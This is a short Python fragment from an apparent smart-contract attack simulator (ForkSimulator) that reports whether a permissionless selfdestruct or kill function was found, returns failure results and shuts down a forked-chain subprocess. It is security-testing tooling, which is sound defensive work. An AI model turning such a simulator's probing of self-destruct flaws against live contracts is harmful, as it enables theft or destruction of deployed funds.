            steps.append({"step": "kill selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": "No permissionless selfdestruct/kill selector found.",
                    "source_finding": source_finding}

        return {"success": False, "attack": attack, "target": target,
                "error": f"ForkSimulator does not support attack '{attack}'",
                "source_finding": source_finding}

    def __exit__(self, exc_type, exc, tb) -> None:
        if self.proc is not None:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=5)
            except Exception:
                self.proc.kill()
            self.proc = None
